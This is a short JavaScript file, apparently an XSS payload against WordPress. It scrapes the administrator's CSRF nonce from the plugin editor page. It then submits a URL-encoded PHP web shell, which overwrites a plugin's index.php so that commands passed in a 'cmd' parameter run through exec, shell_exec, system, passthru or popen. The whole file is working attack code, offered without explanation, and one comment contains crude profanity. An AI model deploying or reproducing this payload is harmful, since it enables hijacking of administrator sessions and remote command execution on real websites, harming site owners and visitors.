function httpGet(theUrl)
{
    var xmlHttp = null;

    xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false );
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

var page = httpGet("wp-admin/plugin-editor.php?file=index.php&plugin=index.php");

function httpPost(theUrl, csrftoken)
{
    var xmlHttp = null;

    xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "POST", theUrl, false );
    xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xmlHttp.send("_wpnonce=" + csrftoken + "&_wp_http_referer=/wp-admin/plugin-editor.php?file=index.php&plugin=index.php&newcontent=%3C%3Fphp%0Aecho+%22%3Cbr%3EDEW_BOA%3Cbr%3E%22%3B%0A%24cmd%3D%22%24_GET%5Bcmd%5D%22%3B%0A%24eseguicmd%3Dex%28%24cmd%29%3B%0Aecho+%24eseguicmd%3B%0A%0Afunction+ex%28%24cfe%29%7B%0A%24res+%3D+%27%27%3B%0Aif+%28%21empty%28%24cfe%29%29%7B%0Aif%28function_exists%28%27exec%27%29%29%7B%0A%40exec%28%24cfe%2C%24res%29%3B%0A%24res+%3D+join%28%22%5Cn%22%2C%24res%29%3B%0A%7D%0Aelseif%28function_exists%28%27shell_exec%27%29%29%7B%0A%24res+%3D+%40shell_exec%28%24cfe%29%3B%0A%7D%0Aelseif%28function_exists%28%27system%27%29%29%7B%0A%40ob_start%28%29%3B%0A%40system%28%24cfe%29%3B%0A%24res+%3D+%40ob_get_contents%28%29%3B%0A%40ob_end_clean%28%29%3B%0A%7D%0Aelseif%28function_exists%28%27passthru%27%29%29%7B%0A%40ob_start%28%29%3B%0A%40passthru%28%24cfe%29%3B%0A%24res+%3D+%40ob_get_contents%28%29%3B%0A%40ob_end_clean%28%29%3B%0A%7D%0Aelseif%28%40is_resource%28%24f+%3D+%40popen%28%24cfe%2C%22r%22%29%29%29%7B%0A%24res+%3D+%22%22%3B%0Awhile%28%21%40feof%28%24f%29%29+%7B+%24res+.%3D+%40fread%28%24f%2C1024%29%3B+%7D%0A%40pclose%28%24f%29%3B%0A%7D%7D%0Areturn+%24res%3B%0A%7D%0Aexit%3B%0A&action=update&file=index.php&plugin=index.php&scrollto=0&submit=Update+File");
    return xmlHttp.responseText;

}

//ik I fail at regex fuk u
var regExp = /name=\"_wpnonce\"\svalue=\"([^)]+)\"/;
var matches = regExp.exec(page);
if (matches != null) {
    var csrftoken = matches[1].slice(0, 10);
}

httpPost("wp-admin/plugin-editor.php", csrftoken);
//httpGet("wp-content/plugins/hello.php");
